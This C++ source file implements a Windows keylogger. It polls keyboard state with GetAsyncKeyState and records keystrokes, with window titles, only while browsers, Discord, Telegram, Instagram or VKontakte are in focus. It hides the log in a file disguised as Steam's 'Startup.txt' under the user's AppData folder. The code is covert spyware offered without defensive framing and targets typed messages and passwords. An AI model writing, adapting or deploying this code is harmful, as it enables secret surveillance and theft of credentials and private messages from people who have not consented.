#define _CRT_SECURE_NO_WARNINGS
#include "InputHandler.hpp"
#include <time.h>
#include "assert.hpp"
void InputHandler::printToFile(const char* directory)
{
	setlocale(LC_ALL, "Russian");
	if (temporaryBuffer.empty())return;
	buffer += temporaryBuffer;
	if (!directory || buffer.empty())return;
	time_t now = time(0);
	tm* ltm = localtime(&now);
	int length = 0;
	std::ifstream helpForFindingLength(directory, std::ios::ate | std::ios::in);
	std::ofstream fileOutputHandler;
	length = helpForFindingLength.tellg();
	helpForFindingLength.close();
	if (length > 0) {
		std::ifstream fileOutputHandlerReserve(directory);
		char* _buffer = new char[length];
		ZeroMemory(_buffer, length);
		fileOutputHandlerReserve.read(_buffer, length);
		fileOutputHandlerReserve.close();
		fileOutputHandler.open(directory);
		assert(fileOutputHandler.is_open());
		for (int i = 0; _buffer[i]; i++)
		{		
			fileOutputHandler << _buffer[i];
		}
		delete[] _buffer;
	}
	if(!fileOutputHandler.is_open())fileOutputHandler.open(directory);
	fileOutputHandler << "[INPUT DATA:]" << ltm->tm_hour << ":" << ltm->tm_min << std::endl;
	fileOutputHandler << buffer;
	fileOutputHandler << std::endl;
	fileOutputHandler.close();
	buffer.clear();
	temporaryBuffer.clear();
}
std::pair<int, int> InputHandler::GetTimeHM(int seconds)
{
	int hours = seconds / 3600;
	int minutes = (seconds - hours * 3600) / 60;
	return { hours, minutes };
}
std::optional<std::string> InputHandler::GetForegroundWindowName()
{
	static const char* processList[] = { "Google Chrome","Opera","Mozila Firefox", "Discord","Telegram","Instagram","¬контакте" };
	WCHAR wWindowText[100];
	std::wstring wWindowTextBuffer;
	HWND hHwnd = GetForegroundWindow();
	static HWND hHwndStatic = GetForegroundWindow();
	GetWindowText(hHwnd, (LPWSTR)&wWindowText, 100);
	wWindowTextBuffer = std::wstring(wWindowText);
	std::string sProcName(wWindowTextBuffer.begin(), wWindowTextBuffer.end());
	std::string ClippedName;
	for (const char* procName : processList)
	{
		if (strstr(sProcName.c_str(), procName)) {
			ClippedName = procName;
		}
	}
	if (ClippedName.empty())return std::nullopt;
	return std::optional<std::string>(ClippedName);
}
std::string InputHandler::GetDirectoryToFile()
{
	wchar_t name[128];
	DWORD size = 128;
	GetUserName((LPWSTR)name, &size);
	std::wstring wuser_name = std::wstring(name);
	std::string user_name = std::string(wuser_name.begin(), wuser_name.end());
	std::string AppDataPath = "C:\\Users\\" + user_name + "\\AppData\\Local\\Steam\\Startup.txt";
	return AppDataPath;
}
void InputHandler::GetPressedChar()
{
	setlocale(LC_ALL, "Russian");
	static std::string oldWindowName;
	std::optional<std::string> WindowName = GetForegroundWindowName();
	if (WindowName.has_value() && oldWindowName != WindowName.value())
	{
		temporaryBuffer += WindowName.value() + ": \n";
		oldWindowName = WindowName.value();
	}
	/*if (!WindowName.has_value() && !oldWindowName.empty())
	{
		temporaryBuffer += oldWindowName + ": \n";
		oldWindowName.clear();
	}*/
	if (!WindowName.has_value() || WindowName == std::nullopt)return;
	for (short i = 8; i <= 190; i++)
	{
		if (GetAsyncKeyState(i) & 0x01) {
			if (i == 8)temporaryBuffer += "[BKS]";
			else if (i == VK_SHIFT)temporaryBuffer += "[ST]";
			else if (i == VK_MENU)temporaryBuffer += "[CTRL]";
			else if (i == VK_RETURN)temporaryBuffer += "[ER]\n";
			else if (i == 32)temporaryBuffer += "[SC]";
			else if (i == VK_TAB)temporaryBuffer += "[Tab]";
			else if (i == VK_CAPITAL)temporaryBuffer += "[Caps]";
			else temporaryBuffer += (char)i;
		}
	}
}
